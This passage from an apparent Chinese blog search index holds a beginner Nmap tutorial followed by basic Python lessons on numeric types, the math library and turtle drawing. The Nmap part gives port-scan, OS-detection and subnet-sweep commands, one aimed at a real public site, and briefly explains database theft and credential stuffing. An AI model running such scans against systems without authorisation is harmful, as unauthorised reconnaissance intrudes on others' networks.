Mapper)，在网络中具有强大的信息收集能力。</p><p>（2）Nmap具备主机探测、服务/版本检测、操作系统检测、网络路由跟踪、Nmap脚本引擎的功能。</p><p>（3）Nmap是kali中自带的工具，命令格式：nmap [参数] IP/IP段/主机名。例如：</p><pre><code>nmap -v -sS -O 10.2.2.2</code></pre><h3 id="选项"><a href="#选项" class="headerlink" title="选项"></a>选项</h3><p>（1）Nmap TCP扫描端口选项</p><table><thead><tr><th align="center">选项</th><th align="center">作用</th></tr></thead><tbody><tr><td align="center">-sP或-sn</td><td align="center">用ping的方式判断是否有存活主机，不扫描端口(要加上掩码，例:10.10.10.0/24)</td></tr><tr><td align="center">-sT</td><td align="center">使用TCP全连接扫描，对目标主机所有端口进行完整的三次握手，如果成功建立连接，则端口是开放的。速度慢，</td></tr><tr><td align="center">-sS</td><td align="center">使用半开连接(SYN stealth)扫描，使用SYN标记位的数据包进行端口探测，收到SYN/ACK包,不再回复ACK包，则端口是开放的，收到RST/ACK包，则端口是关闭的。速度快</td></tr><tr><td align="center">-sA</td><td align="center">TCP ACK扫描使用ACK标志位数据包，若目标主机回复RST数据包，则目标端口没有被过滤(用于发现防火墙的过滤规则)</td></tr></tbody></table><p>（2）Nmap UDP扫描端口选项：</p><p>-sU    使用UDP数据包进行扫描，返回UDP报文，则端口是开放的；返回不可达则端口处于关闭或过滤状态。</p><p>（3）Nmap 目标端口选项：</p><pre><code>-p          //扫描指定端口(常用)-F          //快速扫描100个常用的端口(常用)-Pn         //开放的端口服务-r          //顺序扫描，按从小到大的顺序进行端口扫描</code></pre><p>（4）Nmap 输出选项：</p><pre><code>-oN       //标准输出为指定的文件,也可用导出符&#39;&gt;&#39;,例&gt; 1.txt-oX       //生成XML格式文件可以转换成HTML文件</code></pre><p>（5）其他常用选项:</p><pre><code>-sV      //检测服务端软件版本信息(常用)-O       //检测操作系统信息(常用)-Pn      //禁用nmap的主机检测功能-A       //探测服务版本、对操作系统进行识别、进行脚本扫描、进行路由探测</code></pre><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><pre><code>#使用TCP的SYN扫描检测baidu.com站点的服务版本，系统信息以及扫描常见100个端口nmap -sS -sV -O -F www.baidu.com</code></pre><p><img src="https://i.loli.net/2020/11/28/mVWkoXBKMt9vAY8.png" alt="image-20201128225426693"></p><pre><code>#使用UDP探测scanme.nmap.org的DNS(53),SNMP(161),NTP(123)服务nmap -sU -p 53,161,123 scanme.nmap.org#open   开放#close  关闭#filtered 被过滤</code></pre><p><img src="https://i.loli.net/2021/01/31/SoxlKWvh6ftqMXy.png" alt="image-20210131150814806"></p><pre><code>#获取IP地址段10.10.10.0/24所有在线主机nmap -sP 10.10.10.0/24</code></pre><p><img src="https://i.loli.net/2020/11/28/euU1NCdqnDxoZ4b.png" alt="image-20201128230406623"></p><pre><code>#找出192.168.100.0/24网段所有开放80端口的IP，并把结果保存到result.txtnmap -sT -p 80 --open 192.168.100.0/24  -oN result.txt</code></pre><p><img src="https://i.loli.net/2020/11/28/KrloWijMNvsghxn.png" alt="image-20201128231811428"></p><h3 id="Nmap图形化–Zenmap"><a href="#Nmap图形化–Zenmap" class="headerlink" title="Nmap图形化–Zenmap"></a>Nmap图形化–Zenmap</h3><p>Zenmap是用Python开发的nmap图形化界面，直接在kali终端中输入zenmap即可打开。使用方法：</p><p>（1）输入目标主机的IP地址或域名</p><p>（2）选择一种扫描方式</p><p>（3）根据扫描结果，更改扫描的配置参数或扫描方式，进行再次扫描，以获得更多可利用的、有效的信息。</p><p>（4）开始扫描</p><p>（5）分析zenmap的扫描结果，利用有效信息进一步渗透。</p><p><img src="https://i.loli.net/2020/11/28/Z7a9l8cUomfEbCr.png" alt="image-20201128232633401"></p><h2 id="知识扩展"><a href="#知识扩展" class="headerlink" title="知识扩展"></a>知识扩展</h2><p>在黑客术语里面，”拖库“是指黑客入侵有价值的网络站点，把注册用户的资料数据库全部盗走的行为，因为谐音，也经常被称作“脱裤”，360的库带计划，奖励提交漏洞的白帽子，也是因此而得名。在取得大量的用户数据之后，黑客会通过一系列的技术手段和黑色产业链将有价值的用户数据变现，这通常也被称作“洗库”。最后黑客将得到的数据在其它网站上进行尝试登陆，叫做”撞库“，因为很多用户喜欢使用统一的用户名密码，”撞库“也可以使黑客收获颇丰。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 安全初级 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深入Python语言(一)-基本数据类型01</title>
      <link href="2020/11/28/Python/%E6%B7%B1%E5%85%A5Python%E8%AF%AD%E8%A8%80(%E4%B8%80)-%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B01/"/>
      <url>2020/11/28/Python/%E6%B7%B1%E5%85%A5Python%E8%AF%AD%E8%A8%80(%E4%B8%80)-%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B01/</url>
      
        <content type="html"><![CDATA[<h2 id="数字类型"><a href="#数字类型" class="headerlink" title="数字类型"></a>数字类型</h2><p>表示数字或数值的数据类型称为数字类型，Python语言提供3种数字类型：整数、浮点数和复数，分别对应数学中的整数、实数和复数。</p><h3 id="整数类型"><a href="#整数类型" class="headerlink" title="整数类型"></a>整数类型</h3><p>（1）整数类型与数学中的整数概念一致，整数类型共有4种进制表示：十进制、二进制、八进制和十六进制。默认情况，整数采用十进制，其他进制需要增加引导符号。</p><table><thead><tr><th align="center">进制种类</th><th align="center">引导符号</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">十进制</td><td align="center">无</td><td align="center">默认情况下使用</td></tr><tr><td align="center">二进制</td><td align="center">0b 或 0B</td><td align="center">由0和1组成，例如：0b101,0B101</td></tr><tr><td align="center">八进制</td><td align="center">0o 或 0O</td><td align="center">由字符0到7组成，例如：0o711,0O711</td></tr><tr><td align="center">十六进制</td><td align="center">0x 或 0X</td><td align="center">由字符0到9、a到f、A到F组成，例如0xABC</td></tr></tbody></table><p>（2）整数类型理论上的取值范围是负无穷到正无穷，实际上的取值范围受限于运行Python程序的计算机内存大小。除极大数的运算外，一般认为整数类型没有取值范围限制。</p><p>（3）pow(x,y)函数是Python语言的一个内置函数，用来计算x的y次方。可以使用该函数来测试整数类型的取值范围。例如：</p><pre><code class="python">&gt;&gt;&gt;pow(2,100)1267650600228229401496703205376&gt;&gt;&gt;pow(2,500)3273390607896141870013189696827599152216642046043064789483291368096133796404674554883270092325904157150886684127560071009217256545885393053328527589376</code></pre><p>（4）pow()函数还可以嵌套使用</p><pre><code class="python">&gt;&gt;&gt;pow(2,pow(2,15))</code></pre><h3 id="浮点数类型"><a href="#浮点数类型" class="headerlink" title="浮点数类型"></a>浮点数类型</h3><p>（1）浮点数类型与数学中实数的概念一致，表示带有小数的数值。Python语言要求所有浮点数必须带有小数部分，小数部分可以是0，这样可以区分浮点数和整数类型。</p><p>（2）浮点数有两种表示方法：十进制表示和科学计数法表示。</p><p>科学计数法使用字母e或E作为幂的符号，以10为基数，含义如下：</p><pre><code>&lt;a&gt;e&lt;b&gt; = a * pow(10,b)例如：4.3e-3 =4 .3*pow(10,-3)9.6E5 = 9.6*pow(10,5)     #9.6E5也可表示为9.6E+5</code></pre><p>浮点数类型和整数类型由计算机的不同硬件单元执行，处理方法不同。尽管浮点数0.0与整数0值相同，但在计算机内部的表示不同。</p><p>（3）Python浮点数的数值范围和小数精度受不同计算机系统的限制，sys.float_info详细列出了Python解释器所运行系统的浮点数各项参数。</p><pre><code class="python">&gt;&gt;&gt;import sys    #引入sys函数库&gt;&gt;&gt;sys.float_infosys.float_info(max=1.7976931348623157e+308, max_exp=1024, max_10_exp=308, min=2.2250738585072014e-308, min_exp=-1021, min_10_exp=-307, dig=15, mant_dig=53, epsilon=2.220446049250313e-16, radix=2, rounds=1)&#39;&#39;&#39;上述输出给出了浮点数类型所能表示的最大值(max)、最小值(min)。科学计数法表示下：基数(radix)为2时最大值的幂(max_exp)最大值的幂(max_10_exp)最小值的幂(min_10_exp)能准确计算的浮点数最大个数(dig)系数(&lt;a&gt;)的最大精度(mant_dig)计算机所能分辨的两个相邻浮点数的最小差值(epsilon)&#39;&#39;&#39;&gt;&gt;&gt;sys.float_info.max1.7976931348623157e+308</code></pre><p>（4）浮点数类型直接表示或科学计数法表示中的系数(&lt;a&gt;)最长可输出16个数字，浮点数运算结果中最长可输出17个数字。然而，根据sys.float_info结果，计算机只能提供15个数字(dig)的准确性，例如：</p><pre><code class="python">&gt;&gt;&gt;3.1415926535897924     #17个数字3.1415926535897922        #17个数字，最后一位由计算机根据二进制计算结果确定&gt;&gt;&gt; 987654321123456.789987654321123456.8</code></pre><p>（5）浮点数运算输出17个数字长度的结果，但是只有前15个数字是确定正确的，存在误差。因此浮点数无法进行高精度的数学运算，要获得高精度的运算结果，往往采用整数。使用整数表达浮点数的方法是高精度运算的基本方式之一。</p><pre><code class="python">&gt;&gt;&gt; 3.141592653*1.2345678983.8785094379864535&gt;&gt;&gt; 3141592653*12345678983878509437986453394</code></pre><p>（6）扩展：Python通过标准库decimal提供了一个更精确的数字类型Decimal，并可以使用getcontext().prec参数自定义浮点数精度的位数，例如：</p><pre><code class="python">&gt;&gt;&gt; import decimal&gt;&gt;&gt; a = decimal.Decimal(&#39;3.141592653&#39;)&gt;&gt;&gt; b = decimal.Decimal(&#39;1.234567898&#39;)&gt;&gt;&gt; decimal.getcontext().prec = 19     #自定义精度超过19位数，仍以19位数精度输出&gt;&gt;&gt; a * bDecimal(&#39;3.878509437986453394&#39;)</code></pre><h3 id="复数类型"><a href="#复数类型" class="headerlink" title="复数类型"></a>复数类型</h3><p>（1）复数可以看做是二元有序实数对(a,b)，表示为a+bj。其中，a是实数部分，简称实部；b是虚数部分，简称虚部；j表示”逆时针旋转90度”。复数是实数在二维平面空间旋转的一种表示。</p><p>（2）Python语言中，复数的虚数部分通过后缀”J”或”j”来表示，例如:</p><pre><code>12.3+4j    -5.6+7j     1.23e-4+5.67e+89j</code></pre><p>（3）复数类型中实数部分和虚数部分的数值都是浮点类型。对于复数z，可以用z.real和z.imag分别获得它的实数部分和虚数部分，例如：</p><pre><code class="python">&gt;&gt;&gt; (1.23e-4+5.67e+89j).real0.000123&gt;&gt;&gt; (1.23e-4+5.67e+89j).imag5.67e+89</code></pre><h2 id="数字类型的操作"><a href="#数字类型的操作" class="headerlink" title="数字类型的操作"></a>数字类型的操作</h2><p>Python解释器为数字类型提供数值运算操作符、数值运算函数、类型转换函数等操作方法</p><h3 id="内置的数值运算操作符"><a href="#内置的数值运算操作符" class="headerlink" title="内置的数值运算操作符"></a>内置的数值运算操作符</h3><p>(1)内置操作符(共有9个)有Python解释器直接提供，不需要引用标准或第三方函数库。</p><table><thead><tr><th align="center">操作符</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">x + y</td><td align="center">x与y之和</td></tr><tr><td align="center">x - y</td><td align="center">x与y之差</td></tr><tr><td align="center">x * y</td><td align="center">x与y之积</td></tr><tr><td align="center">x / y</td><td align="center">x与y之商</td></tr><tr><td align="center">x // y</td><td align="center">x与y之整数商，即不大于x与y之商的最大整数</td></tr><tr><td align="center">x % y</td><td align="center">x与y之商的余数，也称为模运算</td></tr><tr><td align="center">-x</td><td align="center">x的负值，即x*(-1)</td></tr><tr><td align="center">+x</td><td align="center">x本身</td></tr><tr><td align="center">x ** y</td><td align="center">x的y次幂</td></tr></tbody></table><p>(2)操作符的运算结果可能改变数字类型，所产生的的结果是”更宽”的类型，基本规则如下：</p><pre><code class="python">#整数之间运算，若数学意义上的结果是小数，结果是浮点数#整数之间运算，若数学意义上的结果是整数，结果是整数#整数和浮点数混合运算，输出结果是浮点数#整数或浮点数与复数运算，输出结果是复数&gt;&gt;&gt;100 / 333.333333333333336&gt;&gt;&gt; 100 // 333&gt;&gt;&gt; 123 + 4.0127.0&gt;&gt;&gt; 10.0 - 1 + 2j   #等价于(10.0 - 1) + 2j(9+2j)</code></pre><p>（3）增强赋值操作符(+=、-=、*=、/=、%=、**=)。若用op表示这些二元数学操作符，则下面的赋值操作等价。注意，二元操作符之间没有空格：</p><pre><code>x op= y等价于x = x op y</code></pre><h3 id="内置的数值运算函数"><a href="#内置的数值运算函数" class="headerlink" title="内置的数值运算函数"></a>内置的数值运算函数</h3><table><thead><tr><th align="center">函数</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">abs(x)</td><td align="center">x的绝对值</td></tr><tr><td align="center">divmod(x,y)</td><td align="center">(x//y,x%y)，输出为二元组形式(也称元组类型)</td></tr><tr><td align="center">pow(x,y[,z])</td><td align="center">(x**y)%z,其中参数z是可选的。使用z时，模运算与幂运算同时进行，速度很快</td></tr><tr><td align="center">round(x,[,ndigits])</td><td align="center">对x四舍五入，保留ndigits为小数。round()返回四舍五入的整数值</td></tr><tr><td align="center">max(x1,x2,…,xn)</td><td align="center">x1,x2,…,xn的最大值，n没有限定</td></tr><tr><td align="center">min(x1,x2,…,xn)</td><td align="center">x1,x2,…,xn的最小值，n没有限定</td></tr></tbody></table><p>注：abs()可以计算复数的绝对值。因此，复数的绝对值是二维坐标系中复数位置到坐标原点的长度，例如：</p><pre><code class="python">&gt;&gt;&gt;abs(-3+4j)5.0</code></pre><h3 id="内置的数字类型转换函数"><a href="#内置的数字类型转换函数" class="headerlink" title="内置的数字类型转换函数"></a>内置的数字类型转换函数</h3><p>浮点数类型转换为整数类型时，小数部分会被舍弃。复数不能直接转换为其他数字类型，可以通过.real和.imag将复数的实部或虚部分别转换。</p><table><thead><tr><th align="center">函数</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">int(x)</td><td align="center">将x转换为整数，x可以是浮点数或字符串</td></tr><tr><td align="center">float(x)</td><td align="center">将x转换为浮点数，x可以是整数或字符串</td></tr><tr><td align="center">complex(re[,im])</td><td align="center">生成一个复数，实部为re，虚部为im。re可以是整数、浮点数或字符串，im可以是整数或浮点数，但不能为字符串</td></tr></tbody></table><pre><code class="python">&gt;&gt;&gt; int(10.99)10&gt;&gt;&gt; complex(10.99)(10.99+0j)&gt;&gt;&gt; float(10 + 99j)          #复数不能直接转换，解释器会报错Traceback (most recent call last):  File &quot;&lt;pyshell#3&gt;&quot;, line 1, in &lt;module&gt;    float(10 + 99j)TypeError: can&#39;t convert complex to float&gt;&gt;&gt; float((10 + 99j).imag)     #转换后的虚数部分为9999.0</code></pre><h2 id="math库的使用"><a href="#math库的使用" class="headerlink" title="math库的使用"></a>math库的使用</h2><h3 id="math库概述"><a href="#math库概述" class="headerlink" title="math库概述"></a>math库概述</h3><p>（1）利用函数库编程是Python语言的重要特点，这些库分为Python环境中默认支持的函数库，以及第三方提供需要进行安装的函数库。其中，默认支持的函数库也叫标准函数库或内置函数库。</p><p>（2）math库是内置函数库，仅支持整数和浮点数运算，不支持复数类型。</p><p>（3）引入形式：</p><pre><code class="Python">import math                #对math库中函数采用math.&lt;b&gt;()形式使用from math import &lt;函数名&gt;   #采用&lt;函数名&gt;()形式使用from math import *         #math库中所有函数都可以采用&lt;函数名&gt;()形式使用</code></pre><h3 id="math库解析"><a href="#math库解析" class="headerlink" title="math库解析"></a>math库解析</h3><p>（1）4个数学常数</p><table><thead><tr><th align="center">常数</th><th align="center">数学表示</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">math.pi</td><td align="center">π</td><td align="center">圆周率，值为3.141 592 653 589 793</td></tr><tr><td align="center">math.e</td><td align="center">e</td><td align="center">自然对数，值为2.718 281 828 459 045</td></tr><tr><td align="center">math.inf</td><td align="center">∞</td><td align="center">正无穷大，负无穷大为-math.inf</td></tr><tr><td align="center">math.nan</td><td align="center"></td><td align="center">非浮点数标记，NaN(not a number)</td></tr></tbody></table><p>（2）16个数值表示函数，这里只列出比较常用的</p><table><thead><tr><th align="center">函数</th><th align="center">数学表示</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">math.fabs(x)</td><td align="center">|x|</td><td align="center">返回x的绝对值</td></tr><tr><td align="center">math.fmod(x)</td><td align="center">x%y</td><td align="center">返回x与y的模</td></tr><tr><td align="center">math.fsum([x,y,…])</td><td align="center">x+y+…</td><td align="center">浮点数精确求和</td></tr><tr><td align="center">math.ceil(x)</td><td align="center"></td><td align="center">向上取整，返回不小于x的最小整数</td></tr><tr><td align="center">math.floor(x)</td><td align="center"></td><td align="center">向下取整，返回不大于x的最大整数</td></tr><tr><td align="center">math.factorial(x)</td><td align="center">x!</td><td align="center">返回x的阶乘，若x为小数或负数，返回ValueError</td></tr><tr><td align="center">math.gcd(a,b)</td><td align="center"></td><td align="center">返回a与b的最大公约数</td></tr><tr><td align="center">math.modf(x)</td><td align="center"></td><td align="center">返回x的小数和整数部分</td></tr><tr><td align="center">math.trunc(x)</td><td align="center"></td><td align="center">返回x的整数部分</td></tr><tr><td align="center">math.isclose(a,b)</td><td align="center"></td><td align="center">比较a和b的相似性，返回True或False</td></tr></tbody></table><pre><code class="python">&gt;&gt;&gt; 0.1 + 0.2 + 0.30.6000000000000001&gt;&gt;&gt; import math&gt;&gt;&gt; math.fsum([0.1, 0.2, 0.3])0.6</code></pre><p>在涉及浮点数运算及结果比较时，建议采用math库提供的函数，而不直接使用Python提供的运算符，以避免精度尾数带来的影响</p><p>（3）8个幂对函数</p><table><thead><tr><th align="center">函数</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">math.pow(x,y)</td><td align="center">返回x的y次幂</td></tr><tr><td align="center">math.exp(x)</td><td align="center">返回e的x次幂，e是自然对数</td></tr><tr><td align="center">math.sqrt(x)</td><td align="center">返回x的平方根</td></tr><tr><td align="center">math.log(x[,base])</td><td align="center">返回x的对数值，只输入x时，底数为e，即lnx</td></tr><tr><td align="center">math.log2(x)</td><td align="center">返回x的2对数值</td></tr><tr><td align="center">math.log10(x)</td><td align="center">返回x的10对数值</td></tr><tr><td align="center">math.log1p(x)</td><td align="center">返回1+x的自然对数值，ln(1+x)</td></tr><tr><td align="center">math.expml(x)</td><td align="center">返回e的x次幂减1</td></tr></tbody></table><pre><code class="python">&gt;&gt;&gt;math.pow(10, 1/3)2.154434690031884</code></pre><p>（4）16个三角运算函数，这里只列出部分函数</p><table><thead><tr><th align="center">函数</th><th align="center">数学表示</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">math.degrees(x)</td><td align="center"></td><td align="center">角度x的弧度值转角度值</td></tr><tr><td align="center">math.radians(x)</td><td align="center"></td><td align="center">角度x的角度值转弧度值</td></tr><tr><td align="center">math.hypot(x,y)</td><td align="center"></td><td align="center">返回(x,y)坐标到原点(0,0)的距离，联想勾股定理</td></tr><tr><td align="center">math.sin(x)</td><td align="center">sinx</td><td align="center">返回x的正弦函数值，x是弧度值</td></tr><tr><td align="center">math.cos(x)</td><td align="center">cosx</td><td align="center">返回x的余弦函数值，x是弧度值</td></tr><tr><td align="center">math.tan(x)</td><td align="center">tanx</td><td align="center">返回x的正切函数值，x是弧度值</td></tr><tr><td align="center">math.asin(x)</td><td align="center">arcsinx</td><td align="center">返回x的反正弦函数值，x是弧度值</td></tr><tr><td align="center">math.acos(x)</td><td align="center">arccosx</td><td align="center">返回x的反余弦函数值，x是弧度值</td></tr><tr><td align="center">math.atan(x)</td><td align="center">arctanx</td><td align="center">返回x的反正切函数值，x是弧度值</td></tr></tbody></table><pre><code class="python">&gt;&gt;&gt; math.atan(1)*4      #arctan1的值是π/43.141592653589793</code></pre><h2 id="天天向上的力量"><a href="#天天向上的力量" class="headerlink" title="天天向上的力量"></a>天天向上的力量</h2><p>（1）一年365天，初始能力值为1.0，好好学习相比前一天提高0.1%，没有学习则相比前一天下降0.1%。分别计算一年下来，每天努力和每天放任的能力值。天天向上的力量是(1+0.001)的365次方，放任的力量是(1-0.001)的365次方。</p><pre><code class="Python">import mathdayup = math.pow((1.0 + 0.001), 365)   #提高0.1%daydown = math.pow((1.0-0.001), 365)   #放任0.1%print(&quot;向上：&#123;:.2f&#125;，向下：&#123;:.2f&#125;。&quot;.format(dayup, daydown))</code></pre><pre><code class="python">&gt;&gt;&gt;向上：1.44，向下：0.69。</code></pre><p>可见，每天提高0.1%，一年将提高44%。</p><p>（2）若学习时每天提高0.5%，放任时下降0.5%。</p><pre><code class="python">import mathdayup = math.pow((1.0 + 0.005), 365)   #提高0.5%daydown = math.pow((1.0-0.005), 365)   #放任0.5%print(&quot;向上：&#123;:.2f&#125;，向下：&#123;:.2f&#125;。&quot;.format(dayup, daydown))</code></pre><pre><code class="python">&gt;&gt;&gt;向上：6.17，向下：0.16。</code></pre><p>每天努力0.5%，一年将提高6倍。</p><p>（3）上面的两个代码中，0.1%、0.5%，这个每天努力的因素根据需求的不同而不断变化。因此，可以用一个变量dayfactor来表示，这样每次只需要修改这个变量值即可。新代码如下：</p><pre><code class="python">import mathdayfactor = 0.01dayup = math.pow((1.0 + dayfactor), 365)     #提高1%daydown = math.pow((1.0-dayfactor), 365)     #放任1%print(&quot;向上：&#123;:.2f&#125;，向下：&#123;:.2f&#125;。&quot;.format(dayup, daydown))</code></pre><pre><code class="python">&gt;&gt;&gt;向上：37.78，向下：0.03。</code></pre><p>每天努力1%，一年将提高37倍。</p><p>（4）每天努力提高1%，放任下降1%。一周努力5天，放任2天。</p><pre><code class="python">dayup, dayfactor = 1.0, 0.01for i in range(365):    if (i % 7) in [6, 0]:        dayup = dayup * (1 - dayfactor)    else:        dayup = dayup * (1 + dayfactor)print(&quot;向上5天向下2天的力量：&#123;:.2f&#125;。&quot;.format(dayup))</code></pre><pre><code class="python">&gt;&gt;&gt;向上5天向下2天的力量：4.63。</code></pre><p>可得，每周努力5天，休息2天，一年仅提高4倍，比起每天坚持所提高的37倍相去甚远。</p><p>（5）同样每周努力5天，休息2天，那么每天需要努力多少才能与天天学习的效果一样。</p><pre><code class="python">def dayUP(df):    dayup = 1.0    for i in range(365):        if (i % 7) in [6, 0]:            dayup = dayup * (1-0.01)        else:            dayup = dayup * (1+df)    return dayup                   #保留字return返回dayUP()的运行结果dayfactor = 0.01while (dayUP(dayfactor) &lt; 37.78):    dayfactor += 0.001print(&quot;每天的努力参数是：&#123;:.3f&#125;。&quot;.format(dayfactor))</code></pre><pre><code class="python">&gt;&gt;&gt;每天的努力参数是：0.019。</code></pre><p>所以每天要努力1.9%才能达到和天天坚持一样的效果。这就是天天向上的力量！</p><p><strong>学习如逆水行舟，不进则退。</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初识Python语言(三)</title>
      <link href="2020/11/26/Python/%E5%88%9D%E8%AF%86Python%E8%AF%AD%E8%A8%80(%E4%B8%89)/"/>
      <url>2020/11/26/Python/%E5%88%9D%E8%AF%86Python%E8%AF%AD%E8%A8%80(%E4%B8%89)/</url>
      
        <content type="html"><![CDATA[<h2 id="实例2：Python蟒蛇绘制"><a href="#实例2：Python蟒蛇绘制" class="headerlink" title="实例2：Python蟒蛇绘制"></a>实例2：Python蟒蛇绘制</h2><pre><code class="python">import turtleturtle.setup(650, 350, 200, 200)turtle.penup()turtle.fd(-250)turtle.pendown()turtle.pensize(25)turtle.pencolor(&quot;purple&quot;)turtle.seth(-40)for i in range(4):    turtle.circle(40, 80)    turtle.circle(-40, 80)turtle.circle(40, 80/2)turtle.fd(40)turtle.circle(16, 180)turtle.fd(40 * 2/3)</code></pre><p>输出效果：</p><p><img src="https://i.loli.net/2020/11/26/jpJvVGNhOBQ2nFc.png" alt="image-20201126222735656"></p><p>（1）实例2中绝大多数的代码都是&lt;a&gt;.&lt;b&gt;()的形式，这是Python的一种典型表达式。它可以表示调用一个对象&lt;a&gt;的方法&lt;b&gt;，也可以表示调用一个函数库&lt;a&gt;中的函数&lt;b&gt;()。实例2中使用了用于绘制图形的turtle库，并通过保留字import引用这个函数库。</p><p>（2）实例2中通过使用函数库并利用库中函数进行编程的方法，称为“模块编程”。</p><h3 id="import对库的引用"><a href="#import对库的引用" class="headerlink" title="import对库的引用"></a>import对库的引用</h3><p>使用import引用函数库有两种方式。</p><p>（1）第一种：</p><pre><code class="python">import &lt;库名&gt;</code></pre><p>此时，可以调用库名中的所有函数，使用库中函数格式如下：</p><pre><code>&lt;库名&gt;.&lt;函数名&gt;(&lt;函数参数&gt;)</code></pre><p>（2）第二种：</p><pre><code class="python">from &lt;库名&gt; import &lt;函数名,函数名,...,函数名&gt;from &lt;库名&gt; import *          #其中，*是通配符，表示所有函数</code></pre><p>此时，调用该库的函数时不再需要使用库名，直接使用如下格式：</p><pre><code>&lt;函数名&gt;(&lt;函数参数&gt;)</code></pre><p>使用第二种库引用方式修改实例2代码，如下：</p><pre><code class="python">from turtle import *       &#39;&#39;&#39;第一条语句也可用如下两条语句代替:from turtle import setup, penup, fd, pendowfrom turtle import pensize, pencolor, seth, circle&#39;&#39;&#39;setup(650, 350, 200, 200)penup()fd(-250)pendown()pensize(25)pencolor(&quot;purple&quot;)seth(-40)for i in range(4):    circle(40, 80)    circle(-40, 80)circle(40, 80/2)fd(40)circle(16, 180)fd(40 * 2/3)</code></pre><table><thead><tr><th align="left">import引用库方法</th><th align="left">优点</th></tr></thead><tbody><tr><td align="left">第一种</td><td align="left">能够显示标明函数来源，在引用较多库时代码的可读性更好</td></tr><tr><td align="left">第二种</td><td align="left">利用保留字直接引用库中函数，使代码更简洁，在引用较少库的情况下效果更佳</td></tr></tbody></table><p>（3）注意事项：第一种引用方式，Python解释器将&lt;a&gt;.&lt;b&gt;整体作为函数名。第二种引用方式，解释器将&lt;b&gt;作为函数名，因此第二种引用方式可能会出现：用户自定义的函数名&lt;b&gt;与库中的函数名&lt;b&gt;冲突的情况。</p><h2 id="turtle库语法元素分析"><a href="#turtle库语法元素分析" class="headerlink" title="turtle库语法元素分析"></a>turtle库语法元素分析</h2><p>Python的turtle库是一个直观有趣的图形绘制函数库</p><h3 id="绘图坐标体系"><a href="#绘图坐标体系" class="headerlink" title="绘图坐标体系"></a>绘图坐标体系</h3><p>（1）turtle库绘制图形有一个基本框架：一个小海龟在坐标系中爬行，其爬行轨迹形成了绘制图形。</p><p>（2）刚开始绘制时，小海龟位于画布正中央，坐标为(0,0)，行进方向为水平右方。</p><p><img src="https://i.loli.net/2020/11/27/ulH8p5UXdWftGKx.png" alt="image-20201127105742159"></p><p>（3）实例2中使用了turtle.setup()函数，其作用是设置主窗体的大小和位置，具体定义如下：</p><pre><code>turtle.setup(width, height, startx, starty)</code></pre><table><thead><tr><th>参数</th><th>含义</th></tr></thead><tbody><tr><td>width</td><td>窗口宽度。若是整数，表示像素值；若是小数，表示窗口宽度与屏幕的比例</td></tr><tr><td>height</td><td>窗口高度。若是整数，表示像素值；若是小数，表示窗口高度与屏幕的比例</td></tr><tr><td>startx</td><td>窗口左侧与屏幕左侧的像素距离。如果值是None，窗口位于屏幕水平中央</td></tr><tr><td>starty</td><td>窗口顶部与屏幕顶部的像素距离。如果值是None，窗口位于屏幕垂直中央</td></tr></tbody></table><h3 id="画笔控制函数"><a href="#画笔控制函数" class="headerlink" title="画笔控制函数"></a>画笔控制函数</h3><h4 id="turtle-penup-和turtle-pendown-函数"><a href="#turtle-penup-和turtle-pendown-函数" class="headerlink" title="turtle.penup()和turtle.pendown()函数"></a>turtle.penup()和turtle.pendown()函数</h4><p>turtle中的画笔(即小海龟)可以通过一组函数来控制，实例2中的penup()和pendown()函数是一组，它们分别表示抬起画笔和落下画笔。</p><table><thead><tr><th>函数</th><th>别名</th><th>作用</th><th>参数</th></tr></thead><tbody><tr><td>turtle.penup()</td><td>turtle.pu()，turtle.up()</td><td>抬起画笔，之后移动画笔不绘制形状</td><td>无</td></tr><tr><td>turtle.pendown()</td><td>turtle.pd()，turtle.down()</td><td>落下画笔，之后移动画笔将绘制形状</td><td>无</td></tr></tbody></table><h4 id="turtle-pensize-函数"><a href="#turtle-pensize-函数" class="headerlink" title="turtle.pensize()函数"></a>turtle.pensize()函数</h4><p>用来设置画笔尺寸。</p><pre><code>定义：turtle.pensize(width)别名：turtle.width()作用：设置画笔宽度，当无参数输入时返回当前画笔宽度参数如下#width。设置的画笔线条宽度，如果为None或者为空，则函数返回当前画笔宽度</code></pre><h4 id="turtle-pencolor-函数"><a href="#turtle-pencolor-函数" class="headerlink" title="turtle.pencolor()函数"></a>turtle.pencolor()函数</h4><p>用来给画笔设置颜色。</p><pre><code>定义：turtle.pencolor(colorstring)或turtle.pencolor((r,g,b))作用：设置画笔颜色，当无参数输入时返回当前画笔颜色参数如下：#colorstring：表示颜色的字符串，例如：“purple”、”red“、”blue“等#(r,g,b)：颜色对应的RGB数值，例如：(51,204,140)</code></pre><p>很多RGB颜色都有固定的英文名字，这些英文名字可以作为colorstring输入，也可采用(r,g,b)形式直接输入。</p><table><thead><tr><th align="center">英文名称</th><th align="center">RGB</th><th align="center">中文名称</th></tr></thead><tbody><tr><td align="center">white</td><td align="center">255 255 255</td><td align="center">白色</td></tr><tr><td align="center">black</td><td align="center">0 0 0</td><td align="center">黑色</td></tr><tr><td align="center">grey</td><td align="center">190 190 190</td><td align="center">灰色</td></tr><tr><td align="center">darkgreen</td><td align="center">0 100 0</td><td align="center">深绿色</td></tr><tr><td align="center">gold</td><td align="center">255 215 0</td><td align="center">金色</td></tr><tr><td align="center">violet</td><td align="center">238 130 238</td><td align="center">紫罗兰</td></tr><tr><td align="center">purple</td><td align="center">160 32 240</td><td align="center">紫色</td></tr></tbody></table><h3 id="形状绘制函数"><a href="#形状绘制函数" class="headerlink" title="形状绘制函数"></a>形状绘制函数</h3><h4 id="turtle-fd-函数"><a href="#turtle-fd-函数" class="headerlink" 